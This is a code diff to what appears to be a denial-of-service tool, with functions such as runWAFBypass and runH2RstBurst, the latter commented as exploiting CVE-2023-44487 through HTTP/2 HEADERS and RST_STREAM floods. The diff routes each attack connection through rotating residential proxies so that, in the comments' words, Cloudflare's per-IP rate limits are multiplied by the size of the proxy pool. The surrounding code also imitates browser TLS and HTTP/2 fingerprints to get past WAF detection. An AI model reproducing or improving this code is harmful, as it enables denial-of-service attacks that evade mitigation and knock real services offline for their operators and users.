@@ -2459,7 +2459,7 @@ async function runWAFBypass(
     ? Math.min(512, Math.max(64, primaryT * 3))
     : Math.min(64,  Math.max(16, primaryT));
 
-  let localPkts = 0, localBytes = 0;
+  let localPkts = 0, localBytes = 0, wPIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
@@ -2468,6 +2468,8 @@ async function runWAFBypass(
   // for that browser. WINDOW_UPDATE is injected into the raw socket on 'connect' to complete
   // the third field of the AKAMAI fingerprint (Chrome=15663105, FF=12517377, Safari=10420224).
   // On 3× block: rotate browser type + TLS profile immediately → different AKAMAI hash.
+  // ★ Proxy rotation: each connection goes through a different residential IP →
+  //   CF sees thousands of different source IPs, each with its own rate-limit bucket.
   const MAX_CONN_LIFE_MS = 15_000;
   const runPrimarySlot = async (tgt = target, s: AbortSignal = signal): Promise<void> => {
     const cookieJar = new Map<string, string>();
@@ -2475,23 +2477,34 @@ async function runWAFBypass(
     let slotBT      = randomBrowserType(); // browser type for this slot
     while (!s.aborted) {
       const bt      = slotBT;
-      const tls     = browserTLSProfile(bt);
+      const tlsB    = browserTLSProfile(bt);
       const wuIncr  = browserWUIncrement(bt);
       const h2set   = browserH2Settings(bt);
       const profile = pickProfile(bt);
       let   blocked = false;
+      const preSocket = proxies.length > 0
+        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
+            ciphers: tlsB.ciphers, ecdhCurve: tlsB.ecdhCurve,
+            minVersion: tlsB.minVersion as "TLSv1.2" | "TLSv1.3",
+          }).catch(() => null)
+        : null;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          c = h2connect(tgt, {
+          const h2opts: Parameters<typeof h2connect>[1] = {
             rejectUnauthorized: false,
-            servername:         hostname,
-            ciphers:            tls.ciphers,
-            ecdhCurve:          tls.ecdhCurve,
-            minVersion:         tls.minVersion as "TLSv1.2" | "TLSv1.3",
             settings:           h2set,
             ALPNProtocols:      ["h2", "http/1.1"],
-          });
+          };
+          if (preSocket) {
+            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
+          } else {
+            h2opts.servername = hostname;
+            h2opts.ciphers    = tlsB.ciphers;
+            h2opts.ecdhCurve  = tlsB.ecdhCurve;
+            h2opts.minVersion = tlsB.minVersion as "TLSv1.2" | "TLSv1.3";
+          }
+          c = h2connect(preSocket ? `https://${hostname}` : tgt, h2opts);
         } catch { resolve(); return; }
         const conn      = c;
         const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, MAX_CONN_LIFE_MS);
@@ -2584,19 +2597,31 @@ async function runWAFBypass(
     const bt        = randomBrowserType();
     const p         = pickProfile(bt);
     const cookieJar = new Map<string, string>();
+    const subTls    = browserTLSProfile(bt);
     while (!s.aborted) {
+      const preSocket = proxies.length > 0
+        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
+            ciphers: subTls.ciphers, ecdhCurve: subTls.ecdhCurve,
+            minVersion: subTls.minVersion as "TLSv1.2" | "TLSv1.3",
+          }).catch(() => null)
+        : null;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          const subTls = browserTLSProfile(bt);
-          c = h2connect(target, {
-            rejectUnauthorized: false, servername: hostname,
-            ciphers:   subTls.ciphers,
-            ecdhCurve: subTls.ecdhCurve,
-            minVersion: subTls.minVersion as "TLSv1.2" | "TLSv1.3",
+          const h2opts: Parameters<typeof h2connect>[1] = {
+            rejectUnauthorized: false,
             settings: browserH2Settings(bt),
             ALPNProtocols: ["h2", "http/1.1"],
-          });
+          };
+          if (preSocket) {
+            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
+          } else {
+            h2opts.servername = hostname;
+            h2opts.ciphers    = subTls.ciphers;
+            h2opts.ecdhCurve  = subTls.ecdhCurve;
+            h2opts.minVersion = subTls.minVersion as "TLSv1.2" | "TLSv1.3";
+          }
+          c = h2connect(preSocket ? `https://${hostname}` : target, h2opts);
         } catch { resolve(); return; }
         const conn    = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
@@ -2754,15 +2779,27 @@ async function runWAFBypass(
   const runDrainSlot = async (): Promise<void> => {
     const cookieJar = new Map<string, string>();
     while (!signal.aborted) {
+      const drainCiphers = randomJA3Ciphers();
+      const preSocket = proxies.length > 0
+        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
+            ciphers: drainCiphers,
+          }).catch(() => null)
+        : null;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          c = h2connect(target, {
-            rejectUnauthorized: false, servername: hostname,
-            ciphers: randomJA3Ciphers(),
+          const h2opts: Parameters<typeof h2connect>[1] = {
+            rejectUnauthorized: false,
             settings: { ...CHROME_H2_SETTINGS, initialWindowSize: 0 },
             ALPNProtocols: ["h2", "http/1.1"],
-          });
+          };
+          if (preSocket) {
+            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
+          } else {
+            h2opts.servername = hostname;
+            h2opts.ciphers    = drainCiphers;
+          }
+          c = h2connect(preSocket ? `https://${hostname}` : target, h2opts);
         } catch { resolve(); return; }
         const conn    = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
@@ -2866,16 +2903,29 @@ async function runWAFBypass(
     const profile   = pickProfile(bt);
     const cookieJar = new Map<string, string>();
     while (!s.aborted) {
-      const tls = browserTLSProfile(bt);
+      const tlsI = browserTLSProfile(bt);
+      const preSocket = proxies.length > 0
+        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
+            ciphers: tlsI.ciphers, ecdhCurve: tlsI.ecdhCurve,
+            minVersion: tlsI.minVersion as "TLSv1.2" | "TLSv1.3",
+          }).catch(() => null)
+        : null;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          c = h2connect(target, {
-            rejectUnauthorized: false, servername: hostname,
-            ciphers: tls.ciphers, ecdhCurve: tls.ecdhCurve,
-            minVersion: tls.minVersion as "TLSv1.2" | "TLSv1.3",
+          const h2opts: Parameters<typeof h2connect>[1] = {
+            rejectUnauthorized: false,
             settings: browserH2Settings(bt), ALPNProtocols: ["h2", "http/1.1"],
-          });
+          };
+          if (preSocket) {
+            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
+          } else {
+            h2opts.servername = hostname;
+            h2opts.ciphers    = tlsI.ciphers;
+            h2opts.ecdhCurve  = tlsI.ecdhCurve;
+            h2opts.minVersion = tlsI.minVersion as "TLSv1.2" | "TLSv1.3";
+          }
+          c = h2connect(preSocket ? `https://${hostname}` : target, h2opts);
         } catch { resolve(); return; }
         const conn    = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
@@ -2924,18 +2974,16 @@ async function runWAFBypass(
   // Also useful for origin discovery (some origins still speak H1.1 only).
   const NUM_H1PIPE = IS_DEPLOYED ? Math.min(Math.floor(primaryT * 0.2), 150) : Math.min(Math.floor(primaryT * 0.2), 5);
   const runH1PipelineSlot = async (s: AbortSignal = signal): Promise<void> => {
-    const tls = await import("node:tls");
     const PIPE_DEPTH = IS_DEPLOYED ? 32 : 8; // requests per pipeline
     while (!s.aborted) {
+      // ★ Use mkTLSSock — routes through proxy when available, else direct
+      let sock: import("node:tls").TLSSocket | null = null;
+      try {
+        sock = await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["http/1.1", "h2"], {
+          ciphers: randomTLSProfile().ciphers,
+        });
+      } catch { await new Promise(r => setTimeout(r, 50)); continue; }
       await new Promise<void>(resolve => {
-        let sock: import("node:tls").TLSSocket | null = null;
-        try {
-          sock = tls.connect({
-            host: resolvedIp, port: 443, servername: hostname,
-            rejectUnauthorized: false,
-            ciphers: randomTLSProfile().ciphers,
-          });
-        } catch { resolve(); return; }
         const s0 = sock;
         const cleanup = () => { try { s0.destroy(); } catch { /**/ } resolve(); };
         const lifeT = setTimeout(cleanup, 10_000);
@@ -3061,6 +3109,7 @@ async function runH2RstBurst(
   threads:    number,
   signal:     AbortSignal,
   onStats:    (p: number, b: number) => void,
+  proxies:    ProxyConfig[] = [],
 ): Promise<void> {
   const { connect: h2connect } = await import("node:http2");
   const target   = `https://${resolvedIp}:${port}`;
@@ -3072,28 +3121,39 @@ async function runH2RstBurst(
     ? Math.min(threads * 8, 2000)     // 2K in-flight streams (deployed)
     : Math.min(threads * 4, 200);     // 200 in-flight streams (dev)
 
-  let localPkts = 0, localBytes = 0;
+  let localPkts = 0, localBytes = 0, pIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   const runSlot = async (): Promise<void> => {
     while (!signal.aborted) {
-      const tls = randomTLSProfile();
+      const tlsP = randomTLSProfile();
+      // ★ Route each RST connection through a different proxy IP — each proxy IP gets
+      //   its own CF rate-limit bucket, multiplying effective RST rate by proxy pool size.
+      const preSocket = proxies.length > 0
+        ? await mkTLSSock(proxies, pIdx++, resolvedIp, hostname, port, ["h2"], {
+            ciphers:    tlsP.ciphers,
+            ecdhCurve:  tlsP.ecdhCurve,
+            minVersion: tlsP.minVersion as "TLSv1.2" | "TLSv1.3",
+          }).catch(() => null)
+        : null;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
-          c = h2connect(target, {
+          const h2opts: Parameters<typeof h2connect>[1] = {
             rejectUnauthorized: false,
-            servername:  hostname,
-            ciphers:     tls.ciphers,
-            ecdhCurve:   tls.ecdhCurve,
-            minVersion:  tls.minVersion as "TLSv1.2" | "TLSv1.3",
-            settings: {
-              ...CHROME_H2_SETTINGS,
-              maxConcurrentStreams: INFLIGHT,
-            },
+            settings: { ...CHROME_H2_SETTINGS, maxConcurrentStreams: INFLIGHT },
             ALPNProtocols: ["h2"],
-          });
+          };
+          if (preSocket) {
+            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
+          } else {
+            h2opts.servername = hostname;
+            h2opts.ciphers    = tlsP.ciphers;
+            h2opts.ecdhCurve  = tlsP.ecdhCurve;
+            h2opts.minVersion = tlsP.minVersion as "TLSv1.2" | "TLSv1.3";
+          }
+          c = h2connect(preSocket ? `https://${hostname}:${port}` : target, h2opts);
         } catch { resolve(); return; }
         const conn    = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
@@ -7381,7 +7441,7 @@ async function runWorker() {
 
   } else if (cfg.method === "h2-rst-burst") {
     // H2 RST Burst — CVE-2023-44487 dedicated: HEADERS+RST_STREAM pairs, pure write-path overload
-    await runH2RstBurst(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runH2RstBurst(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "grpc-flood") {
     // gRPC Flood — HTTP/2 application/grpc content-type, exhausts gRPC handler thread pool
